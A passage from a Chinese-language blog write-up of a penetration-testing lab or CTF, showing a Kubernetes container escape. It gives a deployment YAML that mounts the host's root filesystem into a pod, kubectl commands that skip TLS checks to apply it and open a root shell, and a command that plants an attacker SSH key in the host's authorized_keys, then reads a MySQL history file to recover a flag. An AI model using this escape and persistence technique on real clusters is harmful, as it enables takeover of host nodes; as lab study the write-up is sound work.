</span></span><span style=display:flex><span>        <span style=color:#f92672>app</span>: <span style=color:#ae81ff>nginx</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>containers</span>:
</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>nginx</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>image</span>: <span style=color:#ae81ff>nginx:1.8</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>volumeMounts</span>:
</span></span><span style=display:flex><span>        - <span style=color:#f92672>mountPath</span>: <span style=color:#ae81ff>/mnt</span>
</span></span><span style=display:flex><span>          <span style=color:#f92672>name</span>: <span style=color:#ae81ff>test-volume</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>volumes</span>:
</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>test-volume</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>hostPath</span>:
</span></span><span style=display:flex><span>          <span style=color:#f92672>path</span>: <span style=color:#ae81ff>/</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS E:\tools&gt; kubectl.exe --insecure-skip-tls-verify -s https<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>6443</span>/ apply <span style=color:#f92672>-f</span> aaa.yaml
</span></span><span style=display:flex><span>Please enter Username<span style=color:#960050;background-color:#1e0010>:</span> test
</span></span><span style=display:flex><span>Please enter Password<span style=color:#960050;background-color:#1e0010>:</span> deployment.apps/nginx-deployment configured
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS E:\tools&gt; kubectl.exe --insecure-skip-tls-verify -s https<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>6443</span>/ exec -it nginx-deployment-864f8bfd6f-697jq /bin/bash
</span></span><span style=display:flex><span>kubectl exec [<span style=color:#66d9ef>POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD</span>] -- [<span style=color:#66d9ef>COMMAND</span>] instead.
</span></span><span style=display:flex><span>Please enter Username<span style=color:#960050;background-color:#1e0010>:</span> test
</span></span><span style=display:flex><span>root@nginx-deployment-864f8bfd6f-697jq<span style=color:#960050;background-color:#1e0010>:</span>/<span style=color:#75715e># ls</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>root@nginx-deployment-864f8bfd6f-697jq<span style=color:#960050;background-color:#1e0010>:</span>/<span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid=<span style=color:#ae81ff>0</span>(root) gid=<span style=color:#ae81ff>0</span>(root) groups=<span style=color:#ae81ff>0</span>(root)
</span></span></code></pre></div><p>写个ssh进去</p><pre tabindex=0><code class=language-poowershell data-lang=poowershell>root@nginx-deployment-864f8bfd6f-697jq:/# echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQ................................ root@kali&#39; &gt; /mnt/root/.ssh/authorized_keys
</code></pre><p><img alt=2025-05-19174705 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-19174705.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu-k8s:~# ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>56</span>
</span></span><span style=display:flex><span>drwx------  <span style=color:#ae81ff>8</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>17</span> 16:32 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>22</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>19</span> 16:21 ..
</span></span><span style=display:flex><span>lrwxrwxrwx  <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>9</span> Mar <span style=color:#ae81ff>17</span> 16:32 .bash_history -&gt; /dev/null
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>3106</span> Apr  <span style=color:#ae81ff>9</span>  <span style=color:#ae81ff>2018</span> .bashrc
</span></span><span style=display:flex><span>drwx------  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Jul <span style=color:#ae81ff>18</span>  <span style=color:#ae81ff>2023</span> .cache
</span></span><span style=display:flex><span>drwx------  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Jul <span style=color:#ae81ff>18</span>  <span style=color:#ae81ff>2023</span> .gnupg
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>4</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>17</span> 15:53 .kube
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>14</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>17</span> 15:49 metarget
</span></span><span style=display:flex><span>-rw-------  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1136</span> Mar <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2024</span> .mysql_history
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>295</span> Mar <span style=color:#ae81ff>17</span> 16:11 nginx-deployment.yaml
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Jul <span style=color:#ae81ff>18</span>  <span style=color:#ae81ff>2023</span> .pip
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>148</span> Aug <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2015</span> .profile
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>206</span> May <span style=color:#ae81ff>19</span> 16:21 .pydistutils.cfg
</span></span><span style=display:flex><span>-rw-------  <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>7</span> Mar <span style=color:#ae81ff>17</span> 15:47 .python_history
</span></span><span style=display:flex><span>drwx------  <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Jul <span style=color:#ae81ff>18</span>  <span style=color:#ae81ff>2023</span> .ssh
</span></span></code></pre></div><p>查看一下内容得到了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ubuntu-k8s:~# cat .mysql_history
</span></span><span style=display:flex><span>_HiStOrY_V2_
</span></span><span style=display:flex><span>show<span style=color:#ae81ff>\0</span>40databases;
</span></span><span style=display:flex><span>create<span style=color:#ae81ff>\0</span>40database<span style=color:#ae81ff>\0</span>40flaghaha;
</span></span><span style=display:flex><span>use<span style=color:#ae81ff>\0</span>40flaghaha
</span></span><span style=display:flex><span>DROP<span style=color:#ae81ff>\0</span>40TABLE<span style=color:#ae81ff>\0</span>40IF<span style=color:#ae81ff>\0</span>40EXISTS<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>f1ag<span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>CREATE<span style=color:#ae81ff>\0</span>40TABLE<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>flag06<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>`</span>id<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40int<span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40NULL,
</span></span><span style=display:flex><span><span style=color:#ae81ff>\0</span>40<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>f1agggggishere<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span><span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40NULL
</span></span><span style=display:flex><span><span style=color:#f92672>)</span><span style=color:#ae81ff>\0</span>40ENGINE<span style=color:#f92672>=</span>MyISAM<span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40CHARSET<span style=color:#f92672>=</span>utf8;
</span></span><span style=display:flex><span>CREATE<span style=color:#ae81ff>\0</span>40TABLE<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>flag06<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40<span style=color:#f92672>(</span><span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>id<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40int<span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40NULL,<span style=color:#ae81ff>\0</span>40<span style=color:#ae81ff>\0</span>40<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>f1agggggishere<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span><span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40NULL<span style=color:#ae81ff>\0</span>40<span style=color:#f92672>)</span><span style=color:#ae81ff>\0</span>40ENGINE<span style=color:#f92672>=</span>MyISAM<span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40CHARSET<span style=color:#f92672>=</span>utf8;
</span></span><span style=display:flex><span>show<span style=color:#ae81ff>\0</span>40tables;
</span></span><span style=display:flex><span>drop<span style=color:#ae81ff>\0</span>40table<span style=color:#ae81ff>\0</span>40flag06;
</span></span><span style=display:flex><span>DROP<span style=color:#ae81ff>\0</span>40TABLE<span style=color:#ae81ff>\0</span>40IF<span style=color:#ae81ff>\0</span>40EXISTS<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>f1ag<span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>CREATE<span style=color:#ae81ff>\0</span>40TABLE<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>flag04<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>`</span>id<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40int<span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40NULL,
</span></span><span style=display:flex><span><span style=color:#ae81ff>\0</span>40<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>f1agggggishere<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span><span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40NULL
</span></span><span style=display:flex><span><span style=color:#f92672>)</span><span style=color:#ae81ff>\0</span>40ENGINE<span style=color:#f92672>=</span>MyISAM<span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40CHARSET<span style=color:#f92672>=</span>utf8;
</span></span><span style=display:flex><span>CREATE<span style=color:#ae81ff>\0</span>40TABLE<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>flag04<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40<span style=color:#f92672>(</span><span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>id<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40int<span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40NULL,<span style=color:#ae81ff>\0</span>40<span style=color:#ae81ff>\0</span>40<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>f1agggggishere<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40varchar<span style=color:#f92672>(</span>255<span style=color:#f92672>)</span><span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40NULL<span style=color:#ae81ff>\0</span>40<span style=color:#f92672>)</span><span style=color:#ae81ff>\0</span>40ENGINE<span style=color:#f92672>=</span>MyISAM<span style=color:#ae81ff>\0</span>40DEFAULT<span style=color:#ae81ff>\0</span>40CHARSET<span style=color:#f92672>=</span>utf8;
</span></span><span style=display:flex><span>INSERT<span style=color:#ae81ff>\0</span>40INTO<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>flag<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40VALUES<span style=color:#ae81ff>\0</span>40<span style=color:#f92672>(</span>1,<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>&#39;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>INSERT<span style=color:#ae81ff>\0</span>40INTO<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>`</span>flag04<span style=color:#e6db74>`</span><span style=color:#ae81ff>\0</span>40VALUES<span style=color:#ae81ff>\0</span>40<span style=color:#f92672>(</span>1,<span style=color:#ae81ff>\0</span>40<span style=color:#e6db74>&#39;ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>exit
</span></span></code></pre></div><p>解码一下得到flag</p><pre tabindex=0><code>flag{da69c459-7fe5-4535-b8d1-15fff496a29f}
</code></pre></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">目录</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>目录</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">×</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#flag01>flag01</a></li><li><a href=#flag03>flag03</a></li><li><a href=#flag02>flag02</a></li><li><a href=#flag5>flag5</a></li><li><a href=#flag6>flag6</a></li><li><a href=#flag4>flag4</a></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://blog.0ran9e.cn/posts/%E6%9D%82%E8%B0%88/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%AF%AF%E5%BC%95%E5%8F%91%E7%9A%84%E4%B8%AD%E6%AF%92%E6%BA%AF%E6%BA%90/><span class=title>«</span><br><span>记一次失误引发的中毒溯源</span>
</a><a class=next href=http://blog.0ran9e.cn/posts/%E6%B8%97%E9%80%8F/%E7%BD%91%E9%BC%8E%E6%9D%AF2022/><span class=title>»</span><br><span>网鼎杯2022半决赛复现</span></a></nav></article></main><footer class=footer><span>© 2026
<a href=http://blog.0ran9e.cn/>0raN9e's Blog</a>· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer><button id=tocToggleBtn type=button aria-label="Toggle Table of Contents">收起</button>
<script>(function(){const s=document.querySelector("article.post-single > details.toc"),e=document.getElementById("tocToggleBtn");if(!s||!e){e&&(e.style.display="none");return}const t="toc_hidden",n=()=>{const n=localStorage.getItem(t)==="1";document.documentElement.classList.toggle("toc-hidden",n),e.textContent=n?"目录":"收起"};e.addEventListener("click",()=>{const e=!document.documentElement.classList.contains("toc-hidden");localStorage.setItem(t,e?"1":"0"),n()}),n()})()</script><script>(function(){const t=document.getElementById("theme-toggle");if(!t)return;const s="pref-theme",e=document.documentElement,n=t=>{const n=t==="dark";e.classList.toggle("dark",n);try{localStorage.setItem(s,t)}catch{}e.style.display="none",e.offsetHeight,e.style.display=""},o=()=>{let e=null;try{e=localStorage.getItem(s)}catch{}if(e==="dark"||e==="light")return n(e);window.matchMedia&&n(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")};t.dataset.boundTheme||(t.addEventListener("click",()=>{const t=e.classList.contains("dark");n(t?"light":"dark")}),t.dataset.boundTheme="1"),o()})()</script></body></html>